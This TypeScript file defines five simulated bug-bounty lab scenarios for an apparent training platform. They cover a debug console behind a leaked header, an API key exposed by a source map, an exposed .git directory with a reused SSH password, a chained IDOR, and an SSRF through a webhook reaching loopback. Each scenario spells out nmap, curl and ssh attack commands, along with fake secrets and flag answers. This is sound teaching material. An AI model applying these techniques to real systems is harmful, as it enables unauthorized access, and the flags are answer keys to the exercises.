import { dir, file } from '../vfs';
import type { LabScenario, HostDef } from '../types';

function attacker() {
  return { hostname: 'kali', user: 'root', root: dir({ root: dir({}) }) };
}

export const bugBountyLabs: LabScenario[] = [
  {
    id: 'bb-forgotten-staging',
    title: 'Bug Bounty: The Forgotten Staging Subdomain',
    difficulty: 'Easy',
    category: 'Bug Bounty',
    briefing:
      'Program scope for Meridian Corp includes *.meridiancorp.example (simulated, not a real domain). Recon ' +
      'turned up an old staging host, 10.10.105.1, that the main security review never covered. Its /debug ' +
      'console is disallowed in robots.txt (a classic tell) but is not actually unauthenticated — it is gated ' +
      'behind a leftover QA debug header that a stale changelog file still documents in full.',
    objectives: [
      { text: 'nmap -sV 10.10.105.1', why: 'Confirm the web server and version before touching anything — you always fingerprint a target before probing it, even one that looks abandoned.' },
      { text: 'curl 10.10.105.1/robots.txt', why: 'robots.txt is written for search engine crawlers, but developers routinely (mis)use Disallow entries to hide functionality from Google — which instead hands attackers a map of exactly what not to miss.' },
      { text: 'curl 10.10.105.1/debug', why: 'Confirm the disallowed path actually exists and see how it is protected. Expect a 403-style refusal here — hidden is not the same as unauthenticated, and jumping straight to "it must be open" is a rookie mistake.' },
      { text: 'curl 10.10.105.1/changelog.txt', why: 'Stale changelog/README files left in the web root are a goldmine in real bug bounty recon — QA and ops notes routinely document internal auth mechanisms nobody remembered to remove before launch.' },
      { text: 'curl -H "X-Staging-Token: qa-9f31-legacy" 10.10.105.1/debug', why: 'Replay the exact debug header the changelog just leaked. This models a real disclosed finding: a "hidden" admin surface protected by nothing but a static header value anyone can read from a leftover text file.' },
    ],
    hints: [
      'nmap -sV 10.10.105.1',
      'curl 10.10.105.1/robots.txt — one Disallow entry points straight at a hidden console.',
      'curl 10.10.105.1/debug — it exists, but it refuses you. Note exactly what it says it wants.',
      'curl 10.10.105.1/changelog.txt — old dev notes left in the web root document the "temporary" auth header in full.',
      'curl -H "X-Staging-Token: qa-9f31-legacy" 10.10.105.1/debug',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'staging-old', ip: '10.10.105.1', os: 'Ubuntu 18.04',
        services: [{
          port: 80, name: 'http', version: 'Apache httpd 2.4.29',
          http: {
            '/': '<html><body><h1>Meridian Corp — Staging</h1></body></html>',
            '/robots.txt': 'User-agent: *\nDisallow: /debug\n',
            '/changelog.txt':
              '2019-03-02  Added temporary debug console at /debug for QA (gate it behind X-Staging-Token header before launch)\n' +
              '2019-03-04  X-Staging-Token value for this sprint: qa-9f31-legacy — TODO rotate every sprint (nobody ever did)\n' +
              '2019-04-11  Staging frozen, QA moved to new environment. This host was never decommissioned.\n',
          },
          vulnRoutes: [{
            kind: 'auth-bypass', path: '/debug', param: 'X-Staging-Token', location: 'header',
            triggerSubstrings: ['qa-9f31-legacy'],
            vulnerableResponse:
              '<html><body><h1>Debug Mode Enabled</h1><p>DB_PASSWORD=st4ging_only_2019</p>' +
              '<p>flag{forgotten_staging_subdomain_debug_mode}</p></body></html>',
            normalResponse: '<html><body><h1>403 Forbidden</h1><p>Debug console requires a valid X-Staging-Token header.</p></body></html>',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'bb-js-secret-leak',
    title: 'Bug Bounty: API Key Leaked in a JS Bundle',
    difficulty: 'Easy',
    category: 'Bug Bounty',
    briefing:
      'The main application at 10.10.105.2 ships a large, minified JavaScript bundle. The bundle itself only ' +
      'references an internal config endpoint by name — but it also still ships a production source map, ' +
      'accidentally left enabled, that reverses the minification and exposes the real hardcoded key feeding ' +
      'that endpoint. Analyzing shipped JS (and its source maps) for hardcoded secrets is a core bug bounty ' +
      'recon habit.',
    objectives: [
      { text: 'nmap -sV 10.10.105.2', why: 'Standard first step — confirm the web server before enumerating its content.' },
      { text: 'curl 10.10.105.2/static/app.js', why: 'Read the shipped bundle. Minified production JS rarely shows secrets in plain text, but it does reveal internal endpoint names and, critically, whether a source map was left attached.' },
      { text: 'curl 10.10.105.2/static/app.js.map', why: 'Source maps reverse minification for debugging — they should never ship to production because they hand over the original, unminified source, hardcoded secrets included. This is a very common real bug bounty finding.' },
      { text: 'curl -H "X-Api-Key: mk_live_9f8e7d6c5b4a" 10.10.105.2/internal/api/config', why: 'The bundle referenced this internal endpoint by name but did not show the key needed to call it — only the source map did. Chaining the two confirms real impact: the leaked key actually authenticates.' },
    ],
    hints: [
      'nmap -sV 10.10.105.2',
      'curl 10.10.105.2/static/app.js — note the internal endpoint it calls, and the sourceMappingURL comment at the bottom.',
      'curl 10.10.105.2/static/app.js.map — this un-minifies the bundle and shows the real hardcoded key.',
      'curl -H "X-Api-Key: mk_live_9f8e7d6c5b4a" 10.10.105.2/internal/api/config',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'app-main', ip: '10.10.105.2', os: 'Ubuntu 22.04',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0',
          http: {
            '/': '<html><body><h1>Meridian App</h1></body></html>',
            '/static/app.js':
              'const CONFIG={apiBase:"https://api.meridiancorp.example",internalConfigEndpoint:"/internal/api/config"};' +
              'function a(e){return fetch(CONFIG.internalConfigEndpoint,{headers:{"X-Api-Key":e}})}\n' +
              '//# sourceMappingURL=app.js.map\n',
            '/static/app.js.map':
              '// webpack source map (should never ship to production)\n' +
              '// original source: src/config/internalApi.js\n' +
              'const CONFIG = {\n  apiBase: "https://api.meridiancorp.example",\n' +
              '  // TODO: move to env vars before launch (nobody did)\n' +
              '  internalApiKey: "mk_live_9f8e7d6c5b4a",\n' +
              '  internalConfigEndpoint: "/internal/api/config",\n};\n',
          },
          vulnRoutes: [{
            kind: 'auth-bypass', path: '/internal/api/config', param: 'X-Api-Key', location: 'header',
            triggerSubstrings: ['mk_live_9f8e7d6c5b4a'],
            vulnerableResponse: '{"status":"authenticated","internal_config":{"debug":true},"flag":"flag{hardcoded_api_key_in_js_bundle}"}',
            normalResponse: '{"error":"unauthorized","message":"missing or invalid X-Api-Key"}',
          }],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'bb-exposed-git',
    title: 'Bug Bounty: Exposed .git Directory Leaks a Reused Deploy Token',
    difficulty: 'Hard',
    category: 'Bug Bounty',
    briefing:
      'A deployment script accidentally copied the .git directory into the live web root at 10.10.105.3. This ' +
      'is a frequent real-world bug bounty finding — the full commit history becomes downloadable, including ' +
      'commits that were made specifically to "remove" a secret (which git history never actually deletes). ' +
      'That is the first flag on its own. But the leaked token was also reused as the SSH password for the CI ' +
      'runner that consumes it — exactly the kind of credential-reuse chain that turns an information-disclosure ' +
      'bug into a full foothold, and the second flag.',
    objectives: [
      { text: 'nmap -sV 10.10.105.3', why: 'Confirm the web server before enumerating — a normal-looking site gives no hint of what is sitting in its web root.' },
      { text: 'curl 10.10.105.3/.git/config', why: 'An exposed .git/config confirms the directory is really there and reachable, and reveals the internal repo remote — the standard first check for this well-known misconfiguration class.' },
      { text: 'curl 10.10.105.3/.git/COMMIT_EDITMSG to capture the first flag', why: 'The last commit message describes a security fix — "removed" secrets are a huge tell that the token still exists somewhere in history, and commit messages often carelessly restate the very secret they claim to be removing. The disclosure itself is the first flag.' },
      { text: 'ssh ci-runner@10.10.105.3 using the recovered token as the password, then cat user.txt for the second flag', why: 'The commit message flagged that this token was reused as the CI runner\'s SSH password pending rotation (which never happened) — this is the exact real-world pattern where a single leaked secret grants access far beyond the repository it leaked from, worth a second, higher-severity flag.' },
    ],
    hints: [
      'nmap -sV 10.10.105.3',
      'curl 10.10.105.3/.git/config — confirms the leak and shows the internal GitLab remote.',
      'curl 10.10.105.3/.git/COMMIT_EDITMSG — the commit message meant to "fix" the leak restates the token, says where else it is used, and contains the first flag.',
      'ssh ci-runner@10.10.105.3 — password is the token from the commit message.',
      'Once logged in: cat user.txt for the second flag.',
    ],
    totalFlags: 2,
    attacker: attacker(),
    network: [
      {
        hostname: 'webapp03', ip: '10.10.105.3', os: 'Ubuntu 20.04',
        services: [
          {
            port: 80, name: 'http', version: 'nginx 1.20.1',
            http: {
              '/': '<html><body><h1>Meridian Portal</h1></body></html>',
              '/.git/config': '[core]\n\trepositoryformatversion = 0\n[remote "origin"]\n\turl = git@internal-gitlab.meridiancorp.example:portal/webapp.git\n',
              '/.git/COMMIT_EDITMSG':
                'Remove hardcoded deploy token before launch\n\n' +
                'CI_DEPLOY_TOKEN was hardcoded in deploy.sh (removing from HEAD, still in history — oops).\n' +
                'Old value: gl-deploytok-7f2b9e — this is ALSO the ci-runner SSH password until rotation ships, do not leak.\n\n' +
                'flag{exposed_git_directory_leaks_commit_history}\n',
            },
          },
          { port: 22, name: 'ssh', version: 'OpenSSH 8.2p1' },
        ],
        users: [{ username: 'ci-runner', password: 'gl-deploytok-7f2b9e' }],
        root: dir({
          home: dir({ 'ci-runner': dir({ 'user.txt': file('SSH foothold via a deploy token that was "removed" in HEAD but still readable in git history — and reused as a live password.\nflag{git_leaked_token_grants_ssh_foothold}\n') }) }),
        }),
      } as HostDef,
    ],
  },
  {
    id: 'bb-api-idor',
    title: 'Bug Bounty: IDOR in the Public API Chains into a Second Object',
    difficulty: 'Medium',
    category: 'Bug Bounty',
    briefing:
      'Meridian Corp\'s public API (in scope per the program brief) exposes an order-lookup endpoint that trusts ' +
      'the client-supplied ID with no ownership check. Pulling a neighboring order is the textbook IDOR — but ' +
      'the leaked order also references an internal account ID, and that account-lookup endpoint has the exact ' +
      'same authorization flaw. This is exactly the "recon at scale" lesson: one IDOR often reveals the ' +
      'identifier for a second, more sensitive one.',
    objectives: [
      { text: 'nmap -sV 10.10.105.4', why: 'Confirm the API service before probing endpoints.' },
      { text: 'curl "http://10.10.105.4/api/order?id=5001"', why: 'Establish the baseline — this is your own order. Note the exact response shape so you can tell when a request returns data that is not yours.' },
      { text: 'curl "http://10.10.105.4/api/order?id=5002"', why: 'Simply incrementing the ID returns a different customer\'s order and card data with no authorization check at all — the core IDOR. Note it also references a linked_account ID flagged as an internal test account.' },
      { text: 'curl "http://10.10.105.4/api/account?id=ACCT-77021"', why: 'The account endpoint has the identical flaw: it trusts whatever ID you supply. Following the reference you just found is exactly how real IDOR chains escalate from "leaked one order" to "leaked an internal admin account."' },
    ],
    hints: [
      'nmap -sV 10.10.105.4',
      'curl "http://10.10.105.4/api/order?id=5001" — this is your own order, note the shape of the response.',
      'curl "http://10.10.105.4/api/order?id=5002" — no ownership check; also note the linked_account field.',
      'curl "http://10.10.105.4/api/account?id=ACCT-77021" — same flaw, different endpoint, this is where the flag is.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'api04', ip: '10.10.105.4', os: 'Ubuntu 22.04',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0',
          http: {},
          vulnRoutes: [
            {
              kind: 'idor', path: '/api/order', param: 'id',
              triggerSubstrings: ['5002', '5003', '5099'],
              vulnerableResponse: '{"order_id":5002,"customer":"Another Customer","card_last4":"4242","linked_account":"ACCT-77021 (internal QA/admin test account — flagged, should never appear in prod data)"}',
              normalResponse: '{"order_id":5001,"customer":"You","linked_account":"ACCT-10045"}',
            },
            {
              kind: 'idor', path: '/api/account', param: 'id',
              triggerSubstrings: ['ACCT-77021'],
              vulnerableResponse: '{"account_id":"ACCT-77021","role":"internal-admin","api_key":"REDACTED","flag":"flag{public_api_idor_leaks_order_pii}"}',
              normalResponse: '{"error":"account not found"}',
            },
          ],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
  {
    id: 'bb-ssrf-webhook-scope',
    title: 'Bug Bounty: SSRF via In-Scope Webhook Feature Reaches an Internal Admin API',
    difficulty: 'Hard',
    category: 'Bug Bounty',
    briefing:
      'The integrations page (explicitly listed in scope) lets users register a webhook URL. Confirm the ' +
      'server actually calls that URL server-side, then redirect it internally — exactly the SSRF pattern ' +
      'covered in the Web Application Hacking module. On its own that only proves the bug exists; the leaked ' +
      'internal service token the redirect exposes is what turns it into full unauthorized access to an ' +
      'internal admin API — the difference between a medium- and critical-severity bounty report.',
    objectives: [
      { text: 'nmap -sV 10.10.105.5', why: 'Confirm the web service before testing the webhook feature.' },
      { text: 'curl "http://10.10.105.5/integrations/webhook?callback=https://example.com/hook"', why: 'Confirm the feature genuinely makes a server-side request to whatever URL you supply — the standard first step before attempting any SSRF, so you know the "callback" really is fetched server-side and not just stored.' },
      { text: 'curl "http://10.10.105.5/integrations/webhook?callback=http://127.0.0.1:9000/internal"', why: 'Redirecting the callback to a loopback address is the classic SSRF-to-internal-service move — the server fetches it on your behalf and hands back whatever that internal service says, which here includes a service token never meant to leave the internal network.' },
      { text: 'curl -H "X-Service-Token: reports-svc-9f3d1c" http://10.10.105.5/integrations/admin', why: 'The SSRF alone is only an information leak until you use what it handed you. Authenticating to the gated internal admin API with the leaked token demonstrates full real-world impact — exactly what separates a proof-of-concept from a paid, critical bounty report.' },
    ],
    hints: [
      'nmap -sV 10.10.105.5',
      'curl "http://10.10.105.5/integrations/webhook?callback=https://example.com/hook" — confirms normal, non-malicious behavior first.',
      'curl "http://10.10.105.5/integrations/webhook?callback=http://127.0.0.1:9000/internal" — redirects the server-side fetch inward and leaks an internal service token.',
      'curl -H "X-Service-Token: reports-svc-9f3d1c" http://10.10.105.5/integrations/admin — use the leaked token against the gated internal endpoint.',
    ],
    totalFlags: 1,
    attacker: attacker(),
    network: [
      {
        hostname: 'integrations05', ip: '10.10.105.5', os: 'Ubuntu 22.04',
        services: [{
          port: 80, name: 'http', version: 'nginx 1.22.0',
          http: {},
          vulnRoutes: [
            {
              kind: 'ssrf', path: '/integrations/webhook', param: 'callback',
              triggerSubstrings: ['127.0.0.1', 'localhost', 'internal', '169.254.169.254'],
              vulnerableResponse: '{"status":"delivered","internal_response":"internal-svc-token=reports-svc-9f3d1c (grants /integrations/admin — never expose externally)"}',
              normalResponse: '{"status":"delivered","internal_response":null}',
            },
            {
              kind: 'ssrf', path: '/integrations/admin', param: 'X-Service-Token', location: 'header',
              triggerSubstrings: ['reports-svc-9f3d1c'],
              vulnerableResponse: '{"status":"authenticated","role":"internal-reports-service","flag":"flag{in_scope_ssrf_via_webhook_callback}"}',
              normalResponse: '{"error":"unauthorized"}',
            },
          ],
        }],
        users: [], root: dir({}),
      } as HostDef,
    ],
  },
];
